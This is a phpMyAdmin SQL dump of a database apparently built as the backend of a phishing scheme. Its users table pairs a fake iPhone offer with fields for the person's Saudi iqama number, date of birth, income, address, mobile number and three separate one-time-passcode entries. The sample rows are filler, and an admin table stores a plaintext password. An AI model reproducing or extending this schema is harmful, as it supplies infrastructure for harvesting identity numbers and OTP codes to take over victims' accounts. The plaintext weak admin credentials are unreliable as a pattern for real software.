-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1
-- Generation Time: Jan 11, 2025 at 11:08 AM
-- Server version: 10.4.32-MariaDB
-- PHP Version: 8.2.12

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `swaap`
--

-- --------------------------------------------------------

--
-- Table structure for table `admin`
--

CREATE TABLE `admin` (
  `id` int(255) NOT NULL,
  `username` text NOT NULL,
  `password` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

--
-- Dumping data for table `admin`
--

INSERT INTO `admin` (`id`, `username`, `password`) VALUES
(0, 'admin', 'admin@'),
(0, 'admin', 'admin@'),
(0, 'admin', 'admin@'),
(0, 'admin', 'admin@');

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE `users` (
  `id` int(11) NOT NULL,
  `model` varchar(255) DEFAULT NULL,
  `color` varchar(50) DEFAULT NULL,
  `storage` varchar(50) DEFAULT NULL,
  `date_of_birth` date DEFAULT NULL,
  `nationality` varchar(100) DEFAULT NULL,
  `iqama_number` varchar(50) DEFAULT NULL,
  `mobile_number` varchar(15) NOT NULL,
  `first_otp` varchar(10) DEFAULT NULL,
  `name` varchar(255) NOT NULL,
  `monthly_income` decimal(10,2) DEFAULT NULL,
  `city` varchar(100) DEFAULT NULL,
  `address` text DEFAULT NULL,
  `second_otp` varchar(10) DEFAULT NULL,
  `third_otp` varchar(10) DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `model`, `color`, `storage`, `date_of_birth`, `nationality`, `iqama_number`, `mobile_number`, `first_otp`, `name`, `monthly_income`, `city`, `address`, `second_otp`, `third_otp`, `created_at`, `updated_at`) VALUES
(6, 'iPhone 15 Pro Max', '#205E7C', '64GB', '1977-06-01', 'Syrian', '102', '755', '11223', 'Velma Marshall', 0.00, 'Brady Strickland', 'Amber Holloway', '00111', '22222', '2025-01-11 08:33:32', '2025-01-11 08:33:32'),
(7, 'iPhone 14', '#205E7C', '64GB', '1973-07-12', 'Afghanistan', '482', '831', 'Quaerat ut', 'Cody Logan', 0.00, 'Abbot Caldwell', 'Caldwell Mcclure', 'Cupiditate', 'Veniam adi', '2025-01-11 08:36:20', '2025-01-11 08:36:20'),
(8, 'iPhone 14', '#301933', '128GB', '2022-07-23', 'Afghanistan', '157', '964', '1236', 'Finn Parker', 0.00, 'Tashya Leonard', 'Maxine Terrell', '1123', '2586', '2025-01-11 10:00:39', '2025-01-11 10:00:39'),
(9, 'iPhone 15 Pro Max', '#301933', '128GB', '1993-11-02', 'Ghana', '922', '148', '11223', 'Kristen Santiago', 0.00, 'Dara Barrera', 'Autumn Roach', '11111', '525', '2025-01-11 10:03:06', '2025-01-11 10:03:06');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `mobile_number` (`mobile_number`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=10;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
